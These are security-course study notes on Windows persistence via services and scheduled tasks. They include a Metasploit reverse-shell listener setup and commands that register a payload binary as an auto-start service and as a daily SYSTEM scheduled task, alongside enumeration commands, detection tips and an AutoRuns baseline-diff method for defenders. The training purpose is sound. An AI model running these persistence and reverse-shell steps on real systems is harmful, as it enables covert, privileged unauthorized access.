# Windows Scheduled Tasks & Persistence Techniques

---

## Overview

Scheduled Tasks and Windows Services are two of the most common **persistence mechanisms** used by attackers after gaining initial access to a Windows machine. Once a reverse shell is established, an attacker can register a malicious executable as a service or a scheduled task so that it survives reboots and runs automatically — often under elevated privileges like `SYSTEM`.

---

## Part 1 — Windows Services as a Persistence Mechanism

### 1.1 Setting Up the Listener (Linux/Kali)

Before executing any payload on the target, the attacker sets up a **Metasploit multi-handler** to catch the reverse shell:

```bash
msfconsole -q
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST enp0s3        # attacker's network interface
set LPORT 4444
exploit
```

- `msfconsole -q` — launches Metasploit in quiet mode (no banner)
- `generic/shell_reverse_tcp` — a generic reverse TCP shell payload (non-staged, works across many platforms)
- `LHOST enp0s3` — sets the listening IP using the interface name directly
- `exploit` — starts the listener, waiting for an incoming connection

### 1.2 Executing the Payload (Windows)

On the Windows victim machine, the user (or attacker via social engineering) runs the malicious binary:

```
malware.exe
```

Once executed, the binary connects back to the attacker's listener, and Metasploit catches the reverse shell.

### 1.3 Interacting with the Shell

Back on the Linux attacker machine, once the connection is received:

```bash
shell
```

This drops into an interactive command shell on the Windows target.

---

### 1.4 Creating a Malicious Windows Service

With shell access, the attacker registers the malicious binary as a Windows Service for **persistence**:

```cmd
sc create backupservice binpath= "C:\Users\tcm\Downloads\notmalware.exe" start= auto
```

- `sc create` — creates a new Windows service
- `backupservice` — the name given to the service (deliberately innocuous-sounding)
- `binpath=` — the path to the executable the service will run
- `start= auto` — sets the service to start **automatically** at boot

If successful, the output will show:

```
[SC] CreateService SUCCESS
```

Then, attempting to start it immediately:

```cmd
sc start backupservice
```

This may **fail** at this point because the payload binary is not a properly structured Windows service (it lacks the Service Control Manager API calls). However, on reboot, the binary will still be executed by Windows — which is the goal for persistence.

---

### 1.5 Exploring Services via the GUI (Windows)

On the Windows machine, you can open the **Services** panel (`services.msc`) to inspect all registered services.

Each service entry shows:
- **Name** and **Description**
- **Path to Executable** (binpath)
- **Startup Type:**
  - `Manual` — must be started manually
  - `Manual (Trigger Start)` — started by a system event or trigger
  - `Automatic` — starts at boot
  - `Disabled` — cannot be started

This is exactly how defenders (and attackers performing enumeration) can spot suspicious services — look for unusual names, unexpected paths (e.g., inside `C:\Users\`), or services running from `Downloads` folders.

---

### 1.6 CMD Commands for Service Enumeration

The following commands can be run from the **Windows Command Prompt** (`cmd.exe`):

| Command | Description |
|---|---|
| `net start` | Lists all **currently running** services. Quick way to see what's active. |
| `sc query` | Queries the status of all services (running and stopped). Shows state, type, and PID. |
| `sc query state= all` | Same as above but explicitly includes **all** states (running, stopped, paused). |
| `sc query "backupservice"` | Queries the **specific** service named `backupservice` — shows its current state and type. |
| `sc qc backupservice` | Displays the **full configuration** of `backupservice`: binary path, startup type, account it runs under, dependencies, etc. Useful for identifying privilege escalation opportunities (e.g., service running as SYSTEM with a weak binpath). |

**Example output of `sc qc backupservice`:**
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: backupservice
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\tcm\Downloads\notmalware.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : backupservice
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

`SERVICE_START_NAME: LocalSystem` tells us the service runs as **SYSTEM** — full privileges.

---

### 1.7 PowerShell Commands for Service Enumeration

PowerShell provides more flexible and scriptable ways to query services:

| Command | Description |
|---|---|
| `Get-Service` | Lists **all services** on the system with their status (Running/Stopped). |
| `Get-Service \| Where-Object {$_.Status -eq "Running"}` | Filters to show **only running** services. Uses the pipeline and object property filtering. |
| `Get-Service -Name "backupservice"` | Gets info on a **specific** service by name. |
| `Get-WmiObject -Class Win32_Service -Filter "Name='backupservice'" \| Select-Object *` | Uses **WMI (Windows Management Instrumentation)** to query the service and return **all available properties** — including `PathName`, `StartName` (account), `StartMode`, `State`, and more. Much richer than `Get-Service`. |

> **Note:** `Get-WmiObject` is deprecated in newer PowerShell versions. The modern equivalent is `Get-CimInstance -ClassName Win32_Service`.

**Why use WMI?**  
`Get-Service` only returns basic info. `Get-WmiObject` / `Get-CimInstance` with `Win32_Service` exposes the full service configuration, making it ideal for both **enumeration** and **detection** scripts.

---

## Part 2 — Scheduled Tasks as a Persistence Mechanism

### 2.1 Setting Up the Listener (Linux/Kali)

Same setup as Part 1 — start the Metasploit listener before triggering the payload:

```bash
msfconsole -q
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST enp0s3
set LPORT 4444
exploit
```

Run `malware.exe` on the Windows machine, then interact with the shell:

```bash
shell
```

---

### 2.2 Creating a Malicious Scheduled Task

With shell access, the attacker creates a scheduled task to run the payload daily as `SYSTEM`:

```cmd
schtasks /create /tn "SystemClean" /tr "C:\Users\tcm\Downloads\notmalware.exe" /sc daily /st 09:00 /ru SYSTEM
```

**Parameter breakdown:**

| Parameter | Value | Meaning |
|---|---|---|
| `/create` | — | Create a new scheduled task |
| `/tn` | `"SystemClean"` | **Task Name** — the identifier for the task (looks legitimate) |
| `/tr` | `"C:\Users\tcm\Downloads\notmalware.exe"` | **Task Run** — the executable to run |
| `/sc` | `daily` | **Schedule** — runs once per day |
| `/st` | `09:00` | **Start Time** — triggers at 9:00 AM |
| `/ru` | `SYSTEM` | **Run As** — executes under the NT AUTHORITY\SYSTEM account (highest privileges) |

> **Key point:** Running a task as `SYSTEM` means even a low-privileged attacker's payload will execute with **full system privileges** at the scheduled time.

---

### 2.3 Real-World Reference: QBot Attack Pattern

The instructor references the Elastic Security Labs article on the **QBot (QakBot)** malware family:

🔗 [Exploring the QBot Attack Pattern — Elastic Security Labs](https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern)

QBot is a well-known banking trojan / loader that heavily abuses scheduled tasks for persistence and lateral movement. Studying real malware campaigns like QBot helps understand how these techniques are used in the wild and what defenders should look for.

---

### 2.4 Inspecting Scheduled Tasks via the GUI (Windows)

Open **Task Scheduler** (`taskschd.msc`) on the Windows machine.

The main panel shows all active tasks. Clicking on a task reveals multiple property tabs:

| Tab | What it shows |
|---|---|
| **General** | Task name, description, **security context** (what user it runs as), hidden flag |
| **Triggers** | When the task runs (daily, at logon, on event, etc.) |
| **Actions** | What program/script is executed |
| **Conditions** | Power, network, idle conditions required to run |
| **Settings** | Behavior on failure, run if missed, stop after N hours |
| **History** | Log of past executions (success/failure) |

In the demo, the `SystemClean` task is visible, showing it is set to trigger **daily at 9:00 AM** and **runs as SYSTEM** — two major red flags for defenders.

> **Detection tip:** Any task running from `C:\Users\`, `%TEMP%`, or `%APPDATA%` under a `SYSTEM` or `Administrator` account should be treated as highly suspicious.

---

### 2.5 CMD Commands for Scheduled Task Enumeration

| Command | Description |
|---|---|
| `schtasks /query /fo LIST` | Lists **all scheduled tasks** in a readable list format. `/fo LIST` formats output as a vertical key-value list (easier to read than the default table). |
| `schtasks /query /tn "SystemClean"` | Queries the **specific task** named `SystemClean` — shows basic info. |
| `schtasks /query /tn "SystemClean" /v` | Verbose output — includes **all details**: last run time, next run time, run-as user, status, task-to-run path. |
| `schtasks /query /tn "SystemClean" /v /fo LIST` | Combines verbose (`/v`) with list format (`/fo LIST`) for the most readable and complete output. Best for manual inspection. |

**Example verbose output fields to look for:**

```
TaskName:      \SystemClean
Status:        Ready
Run As User:   SYSTEM
Task To Run:   C:\Users\tcm\Downloads\notmalware.exe
Schedule Type: Daily
Start Time:    9:00:00 AM
```

---

### 2.6 PowerShell — AutoRuns for Persistence Baselining

The instructor references the **AutoRuns** PowerShell module by `p0w3rsh3ll`:

🔗 [https://github.com/p0w3rsh3ll/AutoRuns](https://github.com/p0w3rsh3ll/AutoRuns)

**What it does:**  
AutoRuns enumerates **all persistence locations** on a Windows system — scheduled tasks, services, registry run keys, startup folders, browser extensions, WMI subscriptions, and more.

**The technique — before/after comparison:**

1. **Baseline snapshot** — run AutoRuns *before* the malicious task is created and save the output
2. **Post-infection snapshot** — run AutoRuns *after* the task is created
3. **Diff the two outputs** — anything new or modified is a persistence indicator

This is a key **threat hunting and incident response** technique: rather than manually hunting through hundreds of entries, you diff a clean baseline against the current state to surface anomalies instantly.

```powershell
# Install the module
Install-Module -Name AutoRuns

# Get all autorun entries
Get-PSAutorun

# Export to file for comparison
Get-PSAutorun | Export-Csv -Path C:\baseline.csv

# After infection — compare
$before = Import-Csv C:\baseline.csv
$after  = Get-PSAutorun
Compare-Object $before $after -Property ImagePath, Location
```

---

## Summary — Key Takeaways

| Technique | Command/Tool | Purpose |
|---|---|---|
| Create a service | `sc create` | Persistence via Windows Service |
| Query service config | `sc qc`, `Get-WmiObject Win32_Service` | Enumerate service details |
| Create a scheduled task | `schtasks /create` | Persistence via Task Scheduler |
| Query scheduled tasks | `schtasks /query /v /fo LIST` | Enumerate task details |
| Detect persistence | `AutoRuns` (PowerShell) / `taskschd.msc` | Diff baseline vs current state |

### Why These Techniques Matter

- Both services and scheduled tasks can **survive reboots**
- Running as `SYSTEM` gives **full privileges** without needing a separate privilege escalation step
- Innocent-sounding names (`backupservice`, `SystemClean`) blend in with legitimate system entries
- These are among the **most common ATT&CK techniques**: [T1543.003](https://attack.mitre.org/techniques/T1543/003/) (Windows Service) and [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task)

---

*Notes based on TCM Security course content. For educational and ethical hacking purposes only.*
